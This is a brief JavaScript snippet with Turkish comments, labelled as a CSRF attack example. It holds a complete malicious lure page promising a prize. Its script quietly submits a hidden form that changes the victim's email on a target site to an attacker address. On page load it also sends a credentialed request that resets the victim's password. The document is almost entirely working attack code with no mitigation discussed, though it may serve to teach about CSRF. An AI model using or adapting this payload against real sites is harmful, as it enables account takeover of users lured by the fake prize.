// CSRF Saldırısı Örneği

// Kötü amaçlı bir web sayfası
const maliciousPage = `
<!DOCTYPE html>
<html>
<head>
    <title>Ödül Kazandın!</title>
</head>
<body>
    <h1>Tebrikler! Bir Hediye Kazandınız</h1>
    <p>Hediyenizi almak için lütfen aşağıdaki butona tıklayın.</p>
    <button id="claimButton">Hediyeyi Al</button>
    
    <img src="https://example.com/cute-puppy.jpg" width="400" />
    
    <script>
        // Kullanıcı butona tıkladığında çalışacak zararlı kod
        document.getElementById('claimButton').addEventListener('click', function() {
            // Gizli formu göndererek kullanıcının e-posta adresini değiştir
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://hedefsite.com/update-email';
            form.style.display = 'none';
            
            // CSRF token olmadığı için sunucu bu değişikliği kabul edecek
            const emailField = document.createElement('input');
            emailField.type = 'email';
            emailField.name = 'email';
            emailField.value = 'hacker@malicious.com';
            
            form.appendChild(emailField);
            document.body.appendChild(form);
            form.submit();
            
            alert('Hediyeniz hazırlanıyor, lütfen bekleyin...');
        });
        
        // Sayfa yüklendiğinde otomatik olarak çalışacak zararlı kod
        // (kullanıcının tıklamasına gerek yok!)
        window.onload = function() {
            fetch('https://hedefsite.com/change-password', {
                method: 'POST',
                credentials: 'include',  // Kullanıcının çerezlerini gönder
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    newPassword: 'saldirganinsifresi123'
                })
            });
        }
    </script>
</body>
</html>
`;